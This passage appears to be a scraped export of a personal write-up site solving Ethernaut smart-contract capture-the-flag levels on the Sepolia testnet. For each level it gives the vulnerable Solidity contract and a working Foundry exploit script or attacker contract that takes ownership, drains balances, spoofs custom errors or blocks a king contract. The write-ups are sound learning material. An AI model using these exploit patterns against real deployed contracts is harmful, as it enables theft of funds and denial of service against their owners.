{ require( msg.sender == owner, \"caller is not the owner\" ); _; } function allocate() public payable { allocations[msg.sender] = allocations[msg.sender].add(msg.value); } function sendAllocation(address payable allocator) public { require(allocations[allocator] \u003e 0); allocator.transfer(allocations[allocator]); } function collectAllocations() public onlyOwner { msg.sender.transfer(address(this).balance); } function allocatorBalance(address allocator) public view returns (uint) { return allocations[allocator]; } } We have to claim the owner ship of the program, we can see that their is nothing that seems to prevent us from calling Fal1out() so let‚Äôs try that:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; interface Fallout { function allocatorBalance(address allocator) external view returns (uint); function Fal1out() external payable; function allocate() external payable; function sendAllocation(address payable allocator) external; function collectAllocations() external; } contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_02\"); console.logAddress(addr); vm.startBroadcast(deployerPrivateKey); Fallout instance = Fallout(addr); instance.Fal1out{value: 1}(); //value 1 isnot needed but just in case vm.stopBroadcast(); } } source .env forge script ./script/02.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv "},"title":"Fal1out"},"/projects/ethernaut/fallback-0f16d7ea49bd4084a635ec4d24c77563/":{"data":{"":" How to send ether when interacting with an ABI How to send ether outside of the ABI\nConverting to and from wei/ether units (see help() command)\nFallback methods\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Fallback { mapping(address =\u003e uint) public contributions; address public owner; constructor() { owner = msg.sender; contributions[msg.sender] = 1000 * (1 ether); } modifier onlyOwner { require( msg.sender == owner, \"caller is not the owner\" ); _; } function contribute() public payable { require(msg.value \u003c 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] \u003e contributions[owner]) { owner = msg.sender; } } function getContribution() public view returns (uint) { return contributions[msg.sender]; } function withdraw() public onlyOwner { payable(owner).transfer(address(this).balance); } receive() external payable { require(msg.value \u003e 0 \u0026\u0026 contributions[msg.sender] \u003e 0); owner = msg.sender; } } Call the contribute() function with a value set to 1 wei. Call senTransaction() with 1 wei also to get ownership of the contract. Call withdraw() to extract the funds from the contract. This is frustrating to using the web console to interact with the contract. So I will try to redo the challenge but using foundry this time.\nLet‚Äôs start with the same template as before but with the new contract instance address:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; interface Callee { } contract POC is Script { Callee level0 = Callee(0xCe9D58330C2623e00018a10164399238723A4F01); function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); vm.startBroadcast(deployerPrivateKey); vm.stopBroadcast(); } } It is stated that we have to :\nclaim ownership of the contract reduce its balance to 0 This time it‚Äôs easier to get the contract interface since we directly have access to the contract source code.\ninterface Callee { function owner() view external returns(address); function contribute() external payable; function withdraw() external; function getContribution() external view returns (uint); } This is the corresponding interface of the function we are going to utilize.\nFrom here, everything is quite simple. After a close look at the contract source code we came with the following PoC:\ncontract POC is Script { Callee level1 = Callee(0x7f584a9D74D461eFDaD062AA9AfEe9629b96c780); function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); vm.startBroadcast(deployerPrivateKey); console.logUint(level1.getContribution()); console.logAddress(level1.owner()); level1.contribute{value: 1}(); (bool sent,bytes memory data) = address(level1).call{value: 1}(\"\"); require(sent, \"Failed to sennd Ether\"); console.logBytes(data); console.logUint(level1.getContribution()); level1.withdraw(); console.logUint(level1.getContribution()); console.logAddress(level1.owner()); vm.stopBroadcast(); } } "},"title":"Fallback"},"/projects/ethernaut/force-79bc75128abc41f2b25e56b521833ab6/":{"data":{"":" Some contracts will simply not take your money ¬Ø\\_(„ÉÑ)_/¬Ø\nThe goal of this level is to make the balance of the contract greater than zero.\nThings that might help:\nFallback methods Sometimes the best way to attack a contract is with another contract. See the \"?\" page above, section ‚ÄúBeyond the console‚Äù // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =√∏= / (______)__m_m) */} üí° In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.\nHowever, there is no way to stop an attacker from sending ether to a\ncontract by self destroying. Hence, it is important not to count on the\ninvariant address(this).balance == 0 for any contract logic."},"title":"Force"},"/projects/ethernaut/gatekeeper-one-9bbda6efa6c24367aa643eb73ae92a6a/":{"data":{"":"","#":" title: Gatekeeper One weight: 13 type: docs prev: privacy next: gatekeeper-two\nLevel13 - ‚≠ê‚≠ê‚≠ê‚≠ê\nMake it past the gatekeeper and register as an entrant to pass this level.\nThings that might help: Remember what you‚Äôve learned from the Telephone and Token levels. You can learn more about the special function gasleft(), in Solidity‚Äôs documentation (see here and here). // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract GatekeeperOne { address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { require(gasleft() % 8191 == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\"); require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\"); require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\"); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker, GatekeeperOne} from \"../src/13.sol\"; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address publicKey = vm.envAddress(\"PUBLIC_KEY\"); address addr = vm.envAddress(\"INSTANCE_13\"); vm.startBroadcast(deployerPrivateKey); GatekeeperOne gate = GatekeeperOne(addr); console.log('entrant = %s', gate.entrant()); Attacker attacker = new Attacker(address(gate)); // ----- bytes2 expected = bytes2(uint16(uint160(publicKey))); console.logBytes2(expected); // ----- console.logBytes20(bytes20(publicKey)); bytes8 gateKey = bytes8((uint64((uint160(publicKey) \u003c\u003c 6 * 8)) \u003e\u003e 8 * 6) + 0x0100000000000000); console.log('entrant = %s', gate.entrant()); attacker.attack(gateKey); console.log('entrant = %s', gate.entrant()); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/console.sol\"; interface GatekeeperOne { function entrant() external returns(address); function enter(bytes8 _gateKey) external returns (bool); } contract Attacker { GatekeeperOne gatekeeper; constructor(address _gatekeeper) { gatekeeper = GatekeeperOne(_gatekeeper); } function attack(bytes8 _gateKey) public { gatekeeper.enter{gas: 8191 + 24829}(_gateKey); // 24829 if found through brut force loop simulation (without --broadcast flag we can simulate execution) } } "},"title":"Gatekeeper One"},"/projects/ethernaut/gatekeeper-three-5c1ce9c7f1414b5fb252ec899aa78e83/":{"data":{"":"","#":" Cope with gates and become an entrant.\nThings that might help: Recall return values of low-level functions. Be attentive with semantic. Refresh how storage works in Ethereum. // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract SimpleTrick { GatekeeperThree public target; address public trick; uint private password = block.timestamp; constructor (address payable _target) { target = GatekeeperThree(_target); } function checkPassword(uint _password) public returns (bool) { if (_password == password) { return true; } password = block.timestamp; return false; } function trickInit() public { trick = address(this); } function trickyTrick() public { if (address(this) == msg.sender \u0026\u0026 address(this) != trick) { target.getAllowance(password); } } } contract GatekeeperThree { address public owner; address public entrant; bool public allowEntrance; SimpleTrick public trick; function construct0r() public { owner = msg.sender; } modifier gateOne() { require(msg.sender == owner); require(tx.origin != owner); _; } modifier gateTwo() { require(allowEntrance == true); _; } modifier gateThree() { if (address(this).balance \u003e 0.001 ether \u0026\u0026 payable(owner).send(0.001 ether) == false) { _; } } function getAllowance(uint _password) public { if (trick.checkPassword(_password)) { allowEntrance = true; } } function createTrick() public { trick = new SimpleTrick(payable(address(this))); trick.trickInit(); } function enter() public gateOne gateTwo gateThree { entrant = tx.origin; } receive () external payable {} } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.0; import \"../lib/forge-std/src/console.sol\"; interface GatekeeperThree { function owner() external returns(address); function entrant() external returns(address); function construct0r() external; function getAllowance(uint _password) external; function createTrick() external; function enter() external; } contract Attacker { function attack(GatekeeperThree gate) public payable { gate.construct0r(); gate.createTrick(); gate.getAllowance(block.timestamp); (bool success,) = payable(address(gate)).call{value: address(this).balance }(\"\"); require(success, 'call failed'); gate.enter(); } receive() external payable { revert(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker,GatekeeperThree} from '../src/28.sol'; contract POC is Script { // First I've used this method to find the password but I didn't found why it // wasn't working when broadcasted to sepolia so I just made everything in // one transaction function getUintValue(address targetContract, uint256 slot) public view returns (uint256) { bytes32 slotValue = vm.load(targetContract, bytes32(slot)); return uint256(slotValue); } function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_28\"); vm.startBroadcast(deployerPrivateKey); GatekeeperThree gate = GatekeeperThree(payable(addr)); Attacker attacker = new Attacker(); console.log('entrant: %s', gate.entrant()); console.log('owner: %s', gate.owner()); attacker.attack{ value: 0.001001 ether }(gate); console.log('entrant: %s', gate.entrant()); console.log('owner: %s', gate.owner()); vm.stopBroadcast(); } } "},"title":"Gatekeeper-Three"},"/projects/ethernaut/gatekeeper-two-d4a070f38b644143a295ecf4467fb7fa/":{"data":{"":"","#":" This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.\nThings that might help: Remember what you‚Äôve learned from getting past the first gatekeeper - the first gate is the same. The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See here for more information. The extcodesize call in this gate will get the size of a contract‚Äôs code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper. The ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see here). The Coin Flip level is also a good place to start when approaching this challenge. // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract GatekeeperTwo { address public entrant; modifier gateOne() { require(msg.sender != tx.origin); _; } modifier gateTwo() { uint x; assembly { x := extcodesize(caller()) } require(x == 0); _; } modifier gateThree(bytes8 _gateKey) { require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max); _; } function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { entrant = tx.origin; return true; } } Evm op codes: https://www.evm.codes/?fork=shanghai\nSolution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker,GatekeeperTwo} from \"../src/14.sol\"; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_14\"); vm.startBroadcast(deployerPrivateKey); GatekeeperTwo gate = GatekeeperTwo(addr); new Attacker(address(gate)); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/console.sol\"; interface GatekeeperTwo { function enter(bytes8 _gateKey) external returns (bool); } contract Attacker { GatekeeperTwo gatekeeper; constructor(address _gatekeeper) { gatekeeper = GatekeeperTwo(_gatekeeper); bytes8 value = bytes8(keccak256(abi.encodePacked(address(this)))); bytes8 gateKey = ~value; // gateKey ^ value == type(uint64).max gatekeeper.enter(gateKey); } } "},"title":"Gatekeeper Two"},"/projects/ethernaut/good-samaritan-6e915bab63034c2eb529ae24083e3523/":{"data":{"":" This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it.\nWould you be able to drain all the balance from his Wallet?\nThings that might help:\nSolidity Custom Errors // SPDX-License-Identifier: MIT pragma solidity \u003e=0.8.0 \u003c0.9.0; import \"openzeppelin-contracts-08/utils/Address.sol\"; contract GoodSamaritan { Wallet public wallet; Coin public coin; constructor() { wallet = new Wallet(); coin = new Coin(address(wallet)); wallet.setCoin(coin); } function requestDonation() external returns(bool enoughBalance){ // donate 10 coins to requester try wallet.donate10(msg.sender) { return true; } catch (bytes memory err) { if (keccak256(abi.encodeWithSignature(\"NotEnoughBalance()\")) == keccak256(err)) { // send the coins left wallet.transferRemainder(msg.sender); return false; } } } } contract Coin { using Address for address; mapping(address =\u003e uint256) public balances; error InsufficientBalance(uint256 current, uint256 required); constructor(address wallet_) { // one million coins for Good Samaritan initially balances[wallet_] = 10**6; } function transfer(address dest_, uint256 amount_) external { uint256 currentBalance = balances[msg.sender]; // transfer only occurs if balance is enough if(amount_ \u003c= currentBalance) { balances[msg.sender] -= amount_; balances[dest_] += amount_; if(dest_.isContract()) { // notify contract INotifyable(dest_).notify(amount_); } } else { revert InsufficientBalance(currentBalance, amount_); } } } contract Wallet { // The owner of the wallet instance address public owner; Coin public coin; error OnlyOwner(); error NotEnoughBalance(); modifier onlyOwner() { if(msg.sender != owner) { revert OnlyOwner(); } _; } constructor() { owner = msg.sender; } function donate10(address dest_) external onlyOwner { // check balance left if (coin.balances(address(this)) \u003c 10) { revert NotEnoughBalance(); } else { // donate 10 coins coin.transfer(dest_, 10); } } function transferRemainder(address dest_) external onlyOwner { // transfer balance left coin.transfer(dest_, coin.balances(address(this))); } function setCoin(Coin coin_) external onlyOwner { coin = coin_; } } interface INotifyable { function notify(uint256 amount) external; } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker,GoodSamaritan} from '../src/27.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_27\"); vm.startBroadcast(deployerPrivateKey); GoodSamaritan goodSamaritan = GoodSamaritan(addr); Attacker attacker = new Attacker(); attacker.attack(goodSamaritan); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.0; import \"../lib/forge-std/src/console.sol\"; interface GoodSamaritan { function requestDonation() external returns(bool enoughBalance); } interface INotifyable { function notify(uint256 amount) external; } contract Attacker is INotifyable { error NotEnoughBalance(); function notify(uint256 value) external pure { if (value == 10) { revert NotEnoughBalance(); } } function attack(GoodSamaritan goodSamaritan) public { goodSamaritan.requestDonation(); } } Congratulations!\nCustom errors in Solidity are identified by their 4-byte ‚Äòselector‚Äô, the same as a function call. They are bubbled up through the call chain until they are caught by a catch statement in a try-catch block, as seen in the GoodSamaritan‚Äôs requestDonation() function. For these reasons, it is not safe to assume that the error was thrown by the immediate target of the contract call (i.e., Wallet in this case). Any other contract further down in the call chain can declare the same error and throw it at an unexpected location, such as in the notify(uint256 amount) function in your attacker contract."},"title":"Good-Samaritan"},"/projects/ethernaut/hello-ethernaut-9a7c00bee0ac470faad194c59361cd05/":{"data":{"":" Here we can see the player address, do ctrl + shift + i to open your browser console.\nAfter requesting a new contract instance I got the following:\nHere is how I solved the it:\nHere is the source code after submiting the instance of the contract:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Instance { string public password; uint8 public infoNum = 42; string public theMethodName = 'The method name is method7123949.'; bool private cleared = false; // constructor constructor(string memory _password) { password = _password; } function info() public pure returns (string memory) { return 'You will find what you need in info1().'; } function info1() public pure returns (string memory) { return 'Try info2(), but with \"hello\" as a parameter.'; } function info2(string memory param) public pure returns (string memory) { if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) { return 'The property infoNum holds the number of the next info method to call.'; } return 'Wrong parameter.'; } function info42() public pure returns (string memory) { return 'theMethodName is the name of the next method.'; } function method7123949() public pure returns (string memory) { return 'If you know the password, submit it to authenticate().'; } function authenticate(string memory passkey) public { if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) { cleared = true; } } function getCleared() public view returns (bool) { return cleared; } } Let‚Äôs create a PoC using Foundry. A proof of concept (PoC) exploit is a non-harmful attack against a computer or network. PoC exploits are not meant to cause harm, but to show security weaknesses within software.\nLet‚Äôs configure Forge to deploy our PoC to the Sepolia testnet.\nSolidity scripts are like the scripts you write when working with tools like Hardhat; what makes Solidity scripting different is that they are written in Solidity instead of JavaScript, and they are run on the fast Foundry EVM backend, which provides dry-run capabilities.\nFirst thing first, we have to initialize the forge repository using the following command:\nforge init solidity-scripting Once this is done we end up with the following directory structure and git initiliazied project:\n. ‚îú‚îÄ‚îÄ .env ‚îú‚îÄ‚îÄ foundry.toml ‚îú‚îÄ‚îÄ .git ‚îú‚îÄ‚îÄ .github ‚îú‚îÄ‚îÄ .gitignore ‚îú‚îÄ‚îÄ .gitmodules ‚îú‚îÄ‚îÄ lib ‚îú‚îÄ‚îÄ README.md ‚îú‚îÄ‚îÄ script ‚îú‚îÄ‚îÄ src ‚îî‚îÄ‚îÄ test Inside the .env file, you have to configure your environment variables :\nSEPOLIA_RPC_URL=... PRIVATE_KEY=... ETHERSCAN_API_KEY=... Then, we can clean the default example code provided by forge with the following command:\nrm script/* src/* test/* Now we have settle our environment, we can start creating our Forge script.\nFollowing the documentation our script should be written inside the script folder (what a surprise)\nThe script for the first challenge, which is Hello Ethernaut, is written under the script/00.s.sol file. We will use the same naming convention for the following challenges.\nHere is the first (incomplete) version of our script:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; contract PoC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); vm.startBroadcast(deployerPrivateKey); vm.stopBroadcast(); } } I‚Äôm just going to highlight the part of the documentation that are relevent in the case of this script by quoting them. Make sure you go by yourself into the documentation. Those notes are not meant to be exaustive.\nNow let‚Äôs read through the code and figure out what it actually means and does.\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; Remember even if it‚Äôs a script it still works like a smart contract, but is never deployed, so just like any other smart contract written in Solidity the pragma version has to be specified.\nimport \"forge-std/Script.sol\"; Just like we may import Forge Std to get testing utilities when writing tests, Forge Std also provides some scripting utilities that we import here.\ncontract PoC is Script { We create a contract called PoC and it inherits Script from Forge Std.\nfunction run() external { By default, scripts are executed by calling the function named run, our entrypoint.\nuint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); This loads in the private key from our .env file. Note: you must be careful when exposing private keys in a .env file and loading them into programs. This is only recommended for use with non-privileged deployers or for local / test setups. For production setups please review the various wallet options that Foundry supports.\nvm.startBroadcast(deployerPrivateKey); This is a special cheatcode that records calls and contract creations made by our main script contract. We pass the deployerPrivateKey in order to instruct it to use that key for signing the transactions. Later, we will broadcast these transactions to deploy our PoC contract.","how-to-decypher-the-return-value-#How to decypher the return value ?":"Do you recall that we are supposed to return a string from our function, but here is the output we got: 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000027596f752077696c6c2066696e64207768617420796f75206e65656420696e20696e666f3128292e00000000000000000000000000000000000000000000000000\nOne way to interpret this is by using the cast tooling solution that comes with foundry:\ncast to-ascii 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000027596f752077696c6c2066696e64207768617420796f75206e65656420696e20696e666f3128292e00000000000000000000000000000000000000000000000000 which output the following result:\n'You will find what you need in info1(). A more systematic approach consist maybe to console log the result from within our script:\n... string memory result = level0.info(); console.logString(result); ... Now we have access to the logs directly within the ouput of our script:\nSo, let‚Äôs call the next function info1() don‚Äôt forget to add the info1() function to the interface as we did for info() :\ninterface Callee { function info() external pure returns (string memory); function info1() external pure returns (string memory); } We got the following logs:\nLet‚Äôs continue the process until we find something interesting‚Ä¶\nOK after several method calls we finally got the password to pass the level:\nHere is the code to get the password:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; interface Callee { function info() external pure returns (string memory); function info1() external pure returns (string memory); function info2(string calldata) external pure returns (string memory); function infoNum() external pure returns (uint8); function info42() external pure returns (string memory); function theMethodName() external pure returns (string memory); function method7123949() external pure returns (string memory); function password() external pure returns (string memory); } contract POC is Script { Callee level0 = Callee(0x1548f3154bbB9439762435f7526B6CEbB921B66B); function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); vm.startBroadcast(deployerPrivateKey); string memory result = level0.info(); console.logString(result); result = level0.info1(); console.logString(result); result = level0.info2(\"hello\"); console.logString(result); uint8 numRes = level0.infoNum(); console.logUint(numRes); result = level0.info42(); console.logString(result); result = level0.theMethodName(); console.logString(result); result = level0.method7123949(); console.logString(result); result = level0.password(); console.logString(result); vm.stopBroadcast(); } } Now the last thing to do is to call the authenticate method with the correct password as parameter. With the same method we look at the abi from the js console of the browser the correct method interface:\nWe can see that there is one passKey input param and no outputs. Also, we see that the method state mutability is nonpayable.\nLet‚Äôs create the correct interface in our Callee contract interface:\ninterface Callee { //... function authenticate(string calldata) external; } and call the method from within our script:\ncontract POC is Script { Callee level0 = Callee(0x1548f3154bbB9439762435f7526B6CEbB921B66B); function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); vm.startBroadcast(deployerPrivateKey); //... result = level0.password(); console.logString(result); level0.authenticate(result); vm.stopBroadcast(); } } After few seconds (this correspond to the time that the transaction get verified), we can see the following logs to the console:\n## Setting up 1 EVM. ========================== Simulated On-chain Traces: [50038] 0x1548f3154bbB9439762435f7526B6CEbB921B66B::authenticate(\"ethernaut0\") ‚îî‚îÄ ‚Üê () ========================== Chain 11155111 Estimated gas price: 117.520983462 gwei Estimated total gas used for script: 65049 Estimated amount required: 0.007644622453219638 ETH ========================== ### Finding wallets for all the necessary addresses... ## Sending transactions [0 - 0]. ‚†Å [00:00:00] [###################################################################################################################] 1/1 txes (0.0s) Transactions saved to: /home/jfrancai/repos/ethernaut/broadcast/00.s.sol/11155111/run-latest.json Sensitive values saved to: /home/jfrancai/repos/ethernaut/cache/00.s.sol/11155111/run-latest.json ## Waiting for receipts. ‚†â [00:00:54] [###############################################################################################################] 1/1 receipts (0.0s) ##### sepolia ‚úÖ [Success]Hash: 0x4fbf988e4bdb9179bc921ed3286db5adf546ba0a66fdeaea05c8e339db262973 Block: 5095792 Paid: 0.003921810816665045 ETH (47095 gas * 83.274462611 gwei) Transactions saved to: /home/jfrancai/repos/ethernaut/broadcast/00.s.sol/11155111/run-latest.json Sensitive values saved to: /home/jfrancai/repos/ethernaut/cache/00.s.sol/11155111/run-latest.json ========================== ONCHAIN EXECUTION COMPLETE \u0026 SUCCESSFUL. Total Paid: 0.003921810816665045 ETH (47095 gas * avg 83.274462611 gwei) ## Start verification for (0) contracts All (0) contracts were verified! Transactions saved to: /home/jfrancai/repos/ethernaut/broadcast/00.s.sol/11155111/run-latest.json Sensitive values saved to: /home/jfrancai/repos/ethernaut/cache/00.s.sol/11155111/run-latest.json Now you can submit the instance through the Ethernaut web interface to validate the level.\nCongrats ! You finished the first level of Ethernaut using the Foundry tool chain !ü•≥","how-to-interact-with-a-smart-contract-that-you-dont-have-the-code#How to interact with a smart contract that you don‚Äôt have the code":"In order to do that, we have to create an interface of the contract we want to interact with.\nFrom the Ethernaut guidelines we see that their is an info method available on the contract instance.\nLooking into the console, we see that there are multiple other method available.\nLet‚Äôs begin with the interface for the info method:\ninterface Callee { function info() external pure; } From what we can see in the data object from the console, the state mutability of the function is pure . But we have no idea if the function takes parameters or what is its return type.\nLet‚Äôs try to find out by expending the object:\nAnd there it is!\nThere are no inputs and one output type: a string\nSo, here is what our final interafce looks like:\ninterface Callee { function info() external pure returns (string memory); } Now, we can use this interface inside our script, create a contract instance and call the info function:\ninterface Callee { function info() external pure returns (string memory); } contract POC is Script { Callee level0 = Callee(0x1548f3154bbB9439762435f7526B6CEbB921B66B); function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); vm.startBroadcast(deployerPrivateKey); level0.info(); vm.stopBroadcast(); } } Perfect, let‚Äôs run our script:\nforge script ./script/00.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv Don‚Äôt forget to source .env if you haven‚Äôt done it yet, so you can use env variable.\nCommand Breakdown:\nforge script: This is the main command indicating the use of the Forge tool for smart contract-related operations. ./script/00.s.sol: Specifies the path to the smart contract file (00.s.sol) that is to be deployed. Developers can replace this with the path to their own Solidity smart contract file. ‚Äîrpc-url $SEPOLIA_RPC_URL: Defines the RPC (Remote Procedure Call) URL, which is crucial for interacting with the blockchain network. The $SEPOLIA_RPC_URL variable holds the URL of the blockchain node or network to which the smart contract will be deployed. ‚Äîbroadcast: This flag indicates that the deployment transaction should be broadcasted to the network. Broadcasting is an essential step in the process of making the smart contract part of the blockchain. ‚Äîverify: This flag triggers a verification process, ensuring that the smart contract‚Äôs bytecode matches the one provided in the source code. Verification is a crucial step for ensuring the integrity and security of the deployed smart contract. vvvv: These flags represent the verbosity level of the output. In this case, the use of five ‚Äòv‚Äô flags (vvvv) indicates a high level of verbosity, providing detailed information about each step of the deployment process. This can be helpful for developers to closely monitor and troubleshoot the deployment. And here is the output we got:"},"title":"Hello Ethernaut"},"/projects/ethernaut/king-8338a297a2b447b3b40166c68586199d/":{"data":{"":" The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD\nSuch a fun game. Your goal is to break it.\nWhen you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract King { address king; uint public prize; address public owner; constructor() payable { owner = msg.sender; king = msg.sender; prize = msg.value; } receive() external payable { require(msg.value \u003e= prize || msg.sender == owner); payable(king).transfer(msg.value); king = msg.sender; prize = msg.value; } function _king() public view returns (address) { return king; } } üí° Most of Ethernaut‚Äôs levels try to expose (in an oversimplified form of\ncourse) something that actually happened ‚Äî a real hack or a real bug.\nIn this case, see: King of the Ether and King of the Ether Postmortem.\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; interface King { function prize() external returns(uint); function owner() external returns(address); receive() external payable; function _king() external view returns (address); } contract TheOnlyOneKing { King fakeKing; constructor(address payable _fakeKing) { fakeKing = King(_fakeKing); } function becomeTheOnlyOneKing() public payable { uint prize = fakeKing.prize(); (bool success,) = address(fakeKing).call{value: prize}(\"\"); require(success, 'failed become the only one king'); } receive() external payable { if (fakeKing._king() != address(this)) { payable(fakeKing).transfer(msg.value); } } } This solution is overkill since we can just forbid the to send ether to a contract just by not implementing any fallback function. But this solution is more fun since it‚Äôs like TheOnlyOneKing is always fighting back for his crown ! üëë"},"title":"King"},"/projects/ethernaut/magic-number-6d707756089b4bb286e3ce6cad62ac5c/":{"data":{"":" To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number.\nEasy right? Well‚Ä¶ there‚Äôs a catch.\nThe solver‚Äôs code needs to be really tiny. Really reaaaaaallly tiny. Like freakin‚Äô really really itty-bitty tiny: 10 opcodes at most.\nHint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That‚Äôs right: Raw EVM bytecode.\nGood luck!\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract MagicNum { address public solver; constructor() {} function setSolver(address _solver) public { solver = _solver; } /* ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____ __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___ ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__ ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___ ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____ __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________ _\\///////////\\\\\\//____/\\\\\\/___________ ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ ___________\\///_____\\///////////////__ */ } Solution:\nI recommand using this playground https://www.evm.codes/playground to debug what your are doing.\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; interface Solver { function whatIsTheMeaningOfLife() external returns(uint); } interface MagicNum { function solver() external returns(address); function setSolver(address _solver) external; } contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_18\"); vm.startBroadcast(deployerPrivateKey); MagicNum magicNum = MagicNum(addr); address deployedAddress; assembly { let ptr := mload(0x40) let paddedBytes := shl(mul(8, 13), 0x69602a60005260206000f3600052600a6016f3) mstore(ptr, paddedBytes) deployedAddress := create(0, ptr, 19) } magicNum.setSolver(address(deployedAddress)); Solver(address(magicNum.solver())).whatIsTheMeaningOfLife(); vm.stopBroadcast(); } } There are two parts in this byte code : 0x69{602a60005260206000f3}600052600a6016f3 . The part inside the curly braces {} correspond to the part that will be deployed by the contract constructor (which is the part outside the curly braces).\nEach two digit byte corresponnd to an op code + its following parameters if expected.\nSo:\nThen if we call the return value:"},"title":"Magic Number"},"/projects/ethernaut/motorbike-398e954682a44e3fb7240d3a1a9368bf/":{"data":{"":" Ethernaut‚Äôs motorbike has a brand new upgradeable engine design.\nWould you be able to selfdestruct its engine and make the motorbike unusable ?\nThings that might help:\nEIP-1967 UUPS upgradeable pattern Initializable contract // SPDX-License-Identifier: MIT pragma solidity \u003c0.7.0; import \"openzeppelin-contracts-06/utils/Address.sol\"; import \"openzeppelin-contracts-06/proxy/Initializable.sol\"; contract Motorbike { // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1 bytes32 internal constant 